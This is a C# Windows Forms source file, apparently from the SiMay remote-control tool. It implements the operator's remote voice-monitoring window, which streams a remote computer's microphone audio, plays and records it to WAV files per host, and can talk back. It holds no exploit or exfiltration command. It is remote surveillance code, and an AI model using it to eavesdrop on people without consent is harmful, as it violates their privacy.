using SiMay.Basic;
using SiMay.Core;
using SiMay.Platform.Windows;
using SiMay.RemoteControls.Core;
using SiMay.RemoteMonitor.Attributes;
using System;
using System.IO;
using System.Net;
using System.Windows.Forms;

namespace SiMay.RemoteMonitor.Application
{
    [OnTools]
    [Rank(20)]
    [ApplicationName("远程语音")]
    [AppResourceName("AudioManager")]
    public partial class AudioApplication : Form, IApplication
    {
        [ApplicationAdapterHandler]
        public AudioAdapterHandler AudioAdapterHandler { get; set; }

        private string _title = "//远程语音监听 #Name#";

        private WinSoundRecord _recorder;
        private WinSoundPlayer _player;

        private bool _isRun = false;
        private bool _isPlaying = true;
        private int _recvVoiceDataLength = 0;
        private int _sendVoiceDataLength = 0;
        private int _soundBufferCount = 8;

        private int _samplesPerSecond;
        private short _bitsPerSample;
        private short _channels;
        private int _dataBufferSize;

        private bool _isRecord = false;
        private DateTime _runtimeSpan;
        private PCMStreamToWavHelper _pcmStreamToWavHelper;
        public AudioApplication()
        {
            InitializeComponent();
        }

        public void Start()
        {
            this.Show();
        }

        public void SetParameter(object arg)
        {
            throw new NotImplementedException();
        }

        public void SessionClose(ApplicationBaseAdapterHandler handler)
        {
            this.Text = this._title + " [" + this.AudioAdapterHandler.State.ToString() + "]";
        }

        public void ContinueTask(ApplicationBaseAdapterHandler handler)
        {
            this.Text = this._title;
        }


        private void AudioManager_Load(object sender, EventArgs e)
        {
            this.Text = this._title = this._title.Replace("#Name#", this.AudioAdapterHandler.OriginName);
            this.AudioAdapterHandler.OnPlayerEventHandler += OnPlayerEventHandler;
            Initialize();

            this._runtimeSpan = DateTime.Now;
            System.Timers.Timer timer = new System.Timers.Timer();
            timer.Interval = 1000;
            timer.Elapsed += (s, ex) =>
            {
                try
                {
                    this.Invoke(new Action(() => this.labRuntime.Text = "已运行:" + (DateTime.Now - this._runtimeSpan).ToString("dd\\.hh\\.mm\\.ss")));
                }
                catch
                {
                    timer.Close();
                    timer.Dispose();
                }
            };
            timer.Start();


        }

        private void OnPlayerEventHandler(AudioAdapterHandler adapterHandler, byte[] voiceData)
        {
            if (this._isRun && this._player != null && this._isPlaying == true)
            {
                try
                {
                    this.Invoke(new Action(() =>
                    {
                        this._recvVoiceDataLength += voiceData.Length;
                        recvdataLen.Text = (this._recvVoiceDataLength / 1024).ToString() + " KB";
                    }));
                    this._player.PlayData(voiceData);
                    if (this._isRecord)
                        this._pcmStreamToWavHelper.WritePCMDataChunk(voiceData);
                }
                catch { }
            }
        }

        private void OnOpenDeviceStatusEventHandler(bool playerState, bool recordState)
        {
            if (!playerState && !recordState)
                tip.Text = "远程计算机的播放设备与录音设备未找到!";
            else if (playerState && !recordState)
                tip.Text = "远程录音设备未找到,但可向远程发起说话...........";
            else if (!playerState && recordState)
                tip.Text = "正在监听远程声音,但远程播放设备未找到...........";
            else if (playerState && recordState)
                tip.Text = "正在监听远程声音,并且您可以向远程发起说话...........";
        }

        private async void Initialize()
        {
            _samplesPerSecond = AppConfiguration.AudioSamplesPerSecond;
            _bitsPerSample = (short)AppConfiguration.AudioBitsPerSample;
            _channels = (short)AppConfiguration.AudioChannels;
            _dataBufferSize = 1280;

            string waveOutDeviceName = WinSound.GetWaveOutDeviceNames().Count > 0 ? WinSound.GetWaveOutDeviceNames()[0] : null;

            if (waveOutDeviceName != null)
            {
                _player = new WinSoundPlayer();
                _player.Open(waveOutDeviceName, _samplesPerSecond, _bitsPerSample, _channels, _dataBufferSize, _soundBufferCount);
            }
            else
            {
                MessageBoxHelper.ShowBoxExclamation("本机未找到播放设备!");
            }

            string waveInDeviceName = WinSound.GetWaveInDeviceNames().Count > 0 ? WinSound.GetWaveInDeviceNames()[0] : null;

            if (waveInDeviceName != null)
            {
                _recorder = new WinSoundRecord();
                _recorder.DataRecorded += Recorder_DataRecorded;
                _recorder.Open(waveInDeviceName, _samplesPerSecond, _bitsPerSample, _channels, _dataBufferSize, _soundBufferCount);
            }
            else
            {
                MessageBoxHelper.ShowBoxExclamation("本机未找到录音设备!");
            }
            var result = await this.AudioAdapterHandler.StartRemoteAudio(_samplesPerSecond, _bitsPerSample, _channels);
            if (result.playerEnabled.HasValue && result.recordEnabled.HasValue)
                OnOpenDeviceStatusEventHandler(result.playerEnabled.HasValue, result.recordEnabled.HasValue);

            this._isRun = true;
        }
        private void Recorder_DataRecorded(byte[] voiceData)
        {
            if (this._isPlaying)
                return; //正在播放远程语音，不发送数据

            if (voiceData == null)
                return;

            this.AudioAdapterHandler.SendVoiceDataToRemote(voiceData);

            this.Invoke(new Action(() =>
            {
                this._sendVoiceDataLength += voiceData.Length;
                sendataLen.Text = (this._sendVoiceDataLength / 1024).ToString() + " KB";
            }));
        }

        private void AudioManager_FormClosing(object sender, FormClosingEventArgs e)
        {
            if (this._recorder != null)
                this._recorder.Stop();

            if (this._player != null)
                this._player.Close();

            this._isRun = false;
            this.AudioAdapterHandler.OnPlayerEventHandler -= OnPlayerEventHandler;
            this.AudioAdapterHandler.CloseSession();
        }

        private async void checkBox1_CheckedChanged(object sender, EventArgs e)
        {
            if (checkBox1.Checked)
            {
                if (MessageBox.Show("确认向远程发送本地声音吗?", "提示", MessageBoxButtons.OKCancel, MessageBoxIcon.Exclamation) != DialogResult.OK)
                {
                    checkBox1.Checked = false;
                    return;
                }
                this._isPlaying = false;
                await this.AudioAdapterHandler.SetRemotePlayerStreamEnabled(false);
            }
            else
            {
                await this.AudioAdapterHandler.SetRemotePlayerStreamEnabled(true);
                this._isPlaying = true;
            }
        }
        private void button1_Click(object sender, EventArgs e)
        {
            AudioConfigurationForm dlg = new AudioConfigurationForm();
            dlg.ShowDialog();
        }

        private void checkBox2_CheckedChanged(object sender, EventArgs e)
        {
            if (checkBox2.Checked)
            {
                var directory = Path.Combine(Environment.CurrentDirectory, AudioAdapterHandler.OriginName);
                if (!Directory.Exists(directory))
                    Directory.CreateDirectory(directory);

                var fileName = Path.Combine(directory, $"语音_{DateTime.Now.ToString("yyyy-MM-dd hh_mm_ss")}.wav");

                _pcmStreamToWavHelper = new PCMStreamToWavHelper(fileName, _samplesPerSecond, _bitsPerSample, _channels, _dataBufferSize);
            }
            else
            {
                _pcmStreamToWavHelper.Close();
                MessageBoxHelper.ShowBoxExclamation($"录音已完成,文件位于:{_pcmStreamToWavHelper.FileName}");
            }
            this._isRecord = checkBox2.Checked;
        }
    }
}